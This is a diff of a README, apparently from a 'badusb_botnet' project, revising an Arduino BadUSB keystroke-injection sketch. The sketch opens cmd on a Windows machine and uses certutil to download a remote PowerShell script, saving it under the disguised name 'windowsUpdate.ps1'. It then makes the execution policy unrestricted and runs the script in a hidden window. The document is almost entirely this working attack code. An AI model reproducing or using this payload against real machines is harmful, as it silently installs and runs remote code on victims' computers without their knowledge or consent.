@@ -179,35 +179,43 @@ Decompress the archive and put all in : ```C:\Users\Administrador\AppData\Local\
     <img src="https://steemitimages.com/DQmbXKQU5FScuc9bdhPjjVwBbFy4EK7LuTFtnMe7vEjV7W7/badusb.png" height="100px" width="150px"/>
 </p>
 
+> First, we need put the keyboard.h library in es_ES, to do this you can copy the Keyboard directory of this project into: 
+"C:\Program Files (x86)\Arduino\libraries".
+
 ```c
 #include <Keyboard.h>
+
 void setup() {
-  Keyboard.begin();//Start keyboard communication 
-  delay(3000);//Dela
-}
-void loop(){
-  Keyboard.press(MOD_GUI_LEFT);
-  Keyboard.press('d');
-  Keyboard.release(KEY_LEFT_GUI);
-  delay(500); 
-  
-  Keyboard.println('cmd');
-  delay(500); 
+  Keyboard.begin(); //Start keyboard communication
+  delay(3000);
+  Keyboard.press(KEY_LEFT_GUI);
+  delay(500);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+
+  Keyboard.println("cmd");
+  delay(500);
   Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  
-  Keyboard.println("certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" "Documents/windowsUpdate.ps1"");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
-  Keyboard.println("powershell.exe -windowstyle hidden -file "Documents/windowsUpdate.ps1"");
+  delay(100);
+  Keyboard.releaseAll();
+
+  Keyboard.println("certutil.exe -urlcache -split -f 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1' Documents\windowsUpdate.ps1");
   delay(500);
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
+
   Keyboard.println("powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted");
   delay(500);
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
-  Keyboard.end();
+
+  Keyboard.println("powershell.exe -windowstyle hidden -file 'Documents/windowsUpdate.ps1'");
+  delay(500);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+}
+void loop() {
 }
 ```
 
